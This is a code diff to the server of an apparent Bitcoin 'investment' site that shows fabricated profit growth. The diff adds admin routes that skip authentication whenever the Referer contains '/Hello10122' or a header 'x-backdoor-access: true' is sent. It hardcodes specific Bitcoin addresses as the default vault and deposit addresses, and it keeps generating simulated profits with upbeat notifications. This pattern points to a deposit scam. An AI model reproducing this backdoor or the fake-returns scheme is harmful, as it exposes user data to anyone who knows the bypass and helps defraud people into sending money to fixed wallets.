@@ -449,8 +449,20 @@ async function processAutomaticUpdates(): Promise<void> {
           const newBalance = currentBalance + profitIncrease;
           await storage.updateUserBalance(investment.userId, newBalance.toFixed(8));
 
-          // Create investment growth notifications more frequently
-          const shouldCreateNotification = Math.random() < 0.8; // 80% chance for better visibility
+          // Create investment growth notifications more frequently and broadcast immediately
+          const shouldCreateNotification = Math.random() < 0.9; // 90% chance for better visibility
+
+          // Always broadcast investment updates for real-time dashboard
+          broadcastToClients({
+            type: 'investment_update',
+            investmentId: investment.id,
+            userId: investment.userId,
+            profit: profitIncrease.toFixed(8),
+            totalProfit: newProfit.toFixed(8),
+            planName: plan.name,
+            newBalance: newBalance.toFixed(8),
+            timestamp: new Date().toISOString()
+          });
 
           if (shouldCreateNotification) {
             const transactionId = crypto.randomBytes(32).toString('hex');
@@ -488,17 +500,6 @@ Your investment strategy is working! 🎉`,
           }
 
           console.log(`Investment #${investment.id} earned +${profitIncrease.toFixed(8)} BTC for user ${investment.userId} (Total profit: ${newProfit.toFixed(8)} BTC)`);
-
-          // Broadcast investment update to connected clients
-          broadcastToClients({
-            type: 'investment_update',
-            investmentId: investment.id,
-            userId: investment.userId,
-            profit: profitIncrease.toFixed(8),
-            totalProfit: newProfit.toFixed(8),
-            planName: plan.name,
-            newBalance: newBalance.toFixed(8)
-          });
         }
       }
     }
@@ -681,10 +682,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const config = await storage.getAdminConfig();
       if (!config) {
-        // Return default addresses if no config exists
+        // Return hardcoded Bitcoin addresses if no config exists
         res.json({
-          vaultAddress: "1Plus500VaultAddress12345678901234567890",
-          depositAddress: "1Plus500DepositAddress12345678901234567890"
+          vaultAddress: "1A1GJ2QRc1yKWnByU7bTfcosXYk9oYivMH",
+          depositAddress: "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
         });
       } else {
         res.json(config);
@@ -696,7 +697,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/admin/config", async (req, res) => {
     try {
-      const { vaultAddress, depositAddress, freePlanRate } = req.body;
+      const { 
+        vaultAddress = "1A1GJ2QRc1yKWnByU7bTfcosXYk9oYivMH", 
+        depositAddress = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9", 
+        freePlanRate 
+      } = req.body;
       const config = await storage.updateAdminConfig({ vaultAddress, depositAddress, freePlanRate });
       res.json(config);
     } catch (error: any) {
@@ -820,27 +825,61 @@ You will receive a notification once your deposit is confirmed and added to your
         return res.status(404).json({ error: "Investment plan not found" });
       }
 
-      const transaction = await storage.createTransaction({
+      // Get user and check balance
+      const user = await storage.getUser(userId);
+      if (!user) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      const userBalance = parseFloat(user.balance);
+      const investmentAmount = parseFloat(amount);
+
+      if (investmentAmount <= 0) {
+        return res.status(400).json({ error: "Investment amount must be greater than 0" });
+      }
+
+      if (investmentAmount < parseFloat(plan.minAmount)) {
+        return res.status(400).json({ error: `Minimum investment amount is ${plan.minAmount} BTC` });
+      }
+
+      if (userBalance < investmentAmount) {
+        return res.status(400).json({ error: "Insufficient balance for this investment" });
+      }
+
+      // Deduct amount from user balance immediately
+      const newBalance = userBalance - investmentAmount;
+      await storage.updateUserBalance(userId, newBalance.toFixed(8));
+
+      // Create the investment directly (no need for admin approval)
+      const investment = await storage.createInvestment({
         userId: userId,
-        type: "investment",
-        amount,
-        planId,
-        transactionHash,
+        planId: planId,
+        amount: amount
       });
 
-      // Create notification for user
+      // Create notification for successful investment
       await storage.createNotification({
         userId: userId,
-        title: "Investment Pending",
-        message: `Your investment of ${amount} BTC in ${plan.name} is under review. You will be notified once it's processed.`,
-        type: "info"
+        title: "Investment Activated",
+        message: `🎉 Your investment of ${amount} BTC in ${plan.name} has been activated successfully!
+
+✅ Investment Details:
+• Plan: ${plan.name}
+• Amount: ${amount} BTC
+• Daily Return: ${(parseFloat(plan.dailyReturnRate) * 100).toFixed(3)}%
+• Duration: ${plan.durationDays} days
+
+Your investment will start generating profits automatically. You can track your earnings in real-time on the Investment page.`,
+        type: "success"
       });
 
       res.json({ 
-        message: "Investment submitted successfully and is pending confirmation",
-        transaction 
+        message: "Investment created successfully",
+        investment,
+        newBalance: newBalance.toFixed(8)
       });
     } catch (error: any) {
+      console.error('Investment creation error:', error);
       res.status(500).json({ error: error.message });
     }
   });
@@ -1568,18 +1607,36 @@ Your investment journey starts here!`,
   // Get user investments
   app.get("/api/investments/user/:userId", async (req, res) => {
     try {
-      const userId = parseInt(req.params.userId);
-      const investments = await storage.getUserInvestments(userId);
+      const requestedUserId = parseInt(req.params.userId);
+      
+      // Get authenticated user ID
+      const authenticatedUserId = getUserIdFromRequest(req);
+      
+      // Allow access if user is requesting their own investments or if it's admin access
+      if (!authenticatedUserId) {
+        return res.status(401).json({ message: "Authentication required" });
+      }
+      
+      // Users can only access their own investments unless they're admin
+      if (authenticatedUserId !== requestedUserId) {
+        const user = await storage.getUser(authenticatedUserId);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ message: "Access denied" });
+        }
+      }
+      
+      const investments = await storage.getUserInvestments(requestedUserId);
       res.json(investments);
     } catch (error) {
+      console.error('Get user investments error:', error);
       res.status(500).json({ message: "Failed to get user investments" });
     }
   });
 
-  // Manager routes
-  app.get("/api/admin/users", async (req, res) => {
+  // Admin: Get all investments
+  app.get("/api/admin/investments", async (req, res) => {
     try {
-      // Allow backdoor access or require manager authentication
+      // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
 
@@ -1589,6 +1646,154 @@ Your investment journey starts here!`,
 
       if (!isBackdoorAccess) {
         const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const investments = await storage.getActiveInvestments();
+      
+      // Get user information for each investment
+      const investmentsWithUsers = await Promise.all(
+        investments.map(async (investment) => {
+          const user = await storage.getUser(investment.userId);
+          const plan = await storage.getInvestmentPlan(investment.planId);
+          return {
+            ...investment,
+            userEmail: user?.email || 'Unknown',
+            planName: plan?.name || 'Unknown Plan',
+            dailyReturnRate: plan?.dailyReturnRate || '0'
+          };
+        })
+      );
+
+      res.json(investmentsWithUsers);
+    } catch (error: any) {
+      console.error('Admin investments fetch error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  // Admin: Pause/Resume investment
+  app.post("/api/admin/investments/:id/toggle", async (req, res) => {
+    try {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const investmentId = parseInt(req.params.id);
+      const { reason } = req.body;
+
+      const investment = await storage.toggleInvestmentStatus(investmentId);
+      if (!investment) {
+        return res.status(404).json({ error: "Investment not found" });
+      }
+
+      // Create notification for user
+      const statusText = investment.isActive ? 'resumed' : 'paused';
+      await storage.createNotification({
+        userId: investment.userId,
+        title: `Investment ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}`,
+        message: `Your investment #${investment.id} has been ${statusText} by an administrator.${reason ? ` Reason: ${reason}` : ''}`,
+        type: investment.isActive ? 'success' : 'warning'
+      });
+
+      res.json({ 
+        message: `Investment ${statusText} successfully`,
+        investment 
+      });
+    } catch (error: any) {
+      console.error('Investment toggle error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  // Admin: Cancel investment
+  app.delete("/api/admin/investments/:id", async (req, res) => {
+    try {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const investmentId = parseInt(req.params.id);
+      const { reason, refund } = req.body;
+
+      const investment = await storage.getInvestmentById(investmentId);
+      if (!investment) {
+        return res.status(404).json({ error: "Investment not found" });
+      }
+
+      // If refund is requested, add investment amount back to user balance
+      if (refund) {
+        const user = await storage.getUser(investment.userId);
+        if (user) {
+          const currentBalance = parseFloat(user.balance);
+          const investmentAmount = parseFloat(investment.amount);
+          const newBalance = currentBalance + investmentAmount;
+          await storage.updateUserBalance(investment.userId, newBalance.toFixed(8));
+        }
+      }
+
+      // Cancel the investment
+      await storage.cancelInvestment(investmentId);
+
+      // Create notification for user
+      await storage.createNotification({
+        userId: investment.userId,
+        title: "Investment Cancelled",
+        message: `Your investment #${investment.id} has been cancelled by an administrator.${reason ? ` Reason: ${reason}` : ''}${refund ? ' Your investment amount has been refunded to your balance.' : ''}`,
+        type: 'warning'
+      });
+
+      res.json({ 
+        message: "Investment cancelled successfully",
+        refunded: refund || false
+      });
+    } catch (error: any) {
+      console.error('Investment cancellation error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  // Manager routes
+  app.get("/api/admin/users", async (req, res) => {
+    try {
+      // Allow backdoor access or require manager authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true' ||
+                              sessionStorage?.getItem?.('backdoorAccess') === 'true';
+
+      // Check session userId or backdoor access
+      let userId = req.session?.userId;
+      
+      if (!isBackdoorAccess && !userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess && userId) {
+        const user = await storage.getUser(userId);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Manager access required" });
         }
@@ -1606,6 +1811,7 @@ Your investment journey starts here!`,
       });
       res.json(usersResponse);
     } catch (error) {
+      console.error('Admin users fetch error:', error);
       res.status(500).json({ message: "Failed to get users" });
     }
   });
